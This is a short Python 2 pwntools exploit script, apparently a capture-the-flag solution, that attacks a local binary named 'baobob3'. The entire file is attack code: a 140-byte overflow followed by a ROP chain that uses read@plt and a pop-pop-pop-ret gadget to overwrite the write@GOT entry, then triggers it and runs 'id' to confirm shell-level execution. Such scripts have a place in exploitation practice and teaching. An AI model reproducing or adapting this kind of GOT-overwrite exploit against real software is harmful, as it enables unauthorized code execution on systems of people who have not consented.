from pwn import *
from time import *

p = process("./baobob3")
e = ELF("./baobob3")

read_plt,read_got,write_plt,write_got = e.plt['read'],e.got['read'],e.plt['write'],e.got['write']
pppr_gadget = 0x0804859d
bin_sh = 0x080484a4

payload = "A"*140

payload += p32(read_plt)
payload += p32(pppr_gadget)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)

payload += p32(write_plt)
payload += "AAAA"
p.send(payload)
p.send(p32(bin_sh))
sleep(1)

p.sendline("id")
print p.recv()
